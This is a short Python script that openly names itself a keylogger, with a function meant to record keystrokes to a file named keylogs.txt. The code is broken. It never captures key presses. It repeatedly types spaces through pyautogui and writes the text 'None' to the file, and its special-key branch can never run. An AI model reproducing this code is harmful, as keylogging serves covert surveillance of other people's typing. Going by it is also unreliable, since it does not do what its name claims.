import pyautogui
import time

def log_keystrokes(file_path):
    with open(file_path, 'w') as file:
        while True:
            try:
                key = str(pyautogui.typewrite(['space'], interval=0))
                if key == '[':
                    key += pyautogui.prompt("Please enter special key: ") + ']'
                file.write(key)
                file.flush()
            except Exception as e:
                print(f"Error occurred: {e}")
            time.sleep(0.1)

log_keystrokes('keylogs.txt')
